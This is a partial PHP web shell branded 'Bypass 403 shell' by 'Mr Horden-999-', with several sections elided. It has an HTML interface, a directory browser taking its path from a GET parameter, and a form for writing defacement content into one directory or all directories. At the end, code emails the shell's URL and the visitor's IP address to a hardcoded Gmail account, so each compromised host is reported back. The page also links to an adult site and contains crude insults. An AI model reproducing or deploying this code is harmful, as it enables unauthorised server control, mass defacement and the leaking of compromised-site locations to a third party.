<?php
/*! 
kontol shell gabut bypass 403 forbidden*/
...
<html>
	<head>
		<meta name="description" content="Horden-999-">
		<meta name="author" content="bypass 403">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title>'.$_SERVER['HTTP_HOST'].' ~ Mr Horden-999-/Bypass 403 shell</title>
		<link rel="icon" href="ttps://i.ibb.co/6n8knmh/Horden.jpg" type="image/x-icon">
	<style>
	body{
	font-family: "arial", cursive;
	background-image: url(https://i.gifer.com/NkZQ.gif);
	color:blue;
...
<body>
<center>
<h1 class="blink"><img src="https://i.ibb.co/6n8knmh/Horden.jpg" widht="50%" height="50%" 
style="box-shadow: 0px 0px 20px #ffe185; background-color: red; margin: auto;">
</h1> 
	...
	<div class="container">
		<div class="card text-dark">
			<div class="card-header">
				<a href="https://xnxx.com"><h4><font color="red">Forbidden Shell 403 |</font><i class="fa fa-globe"><font color="yellow">__BY__</font></i> |    Mr Horden-999-</h4></a>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
echo "<center><font>Copyright &copy; ".date("Y")." - <a href='https://github.com/PreEdaetor/bahan_symlink'>Mr Horden-999- kill you</a></center>";
	echo '</div>
	</div>
</div>';
...
echo "<form method='post'>
	...
	<input type='radio' name='tipe' value='biasa' checked>normal /satu dir<input type='radio' name='tipe' value='massal'>sabun massal smua dir</div><br>
	...
	<textarea class='form-control' rows='20' name='script'>Tuoched By Mr Horden</textarea><br />
...
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>- About -</b><br />";
echo "ada banyak shell versi kita silahkan kunjungi juga ster<br />Greetz : <a href=''>Mr Horden-999- - And You</a><br />My github: <a href='https://github.com/PreEdaetor/bahan_symlink'>klik ini ster (bahan2 symlink dan bypass 403 shell)</a>";
	echo '</div>
	</div>
</div>';
}
...
$tujuanmail = 'lambangwes@gmail.com ';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
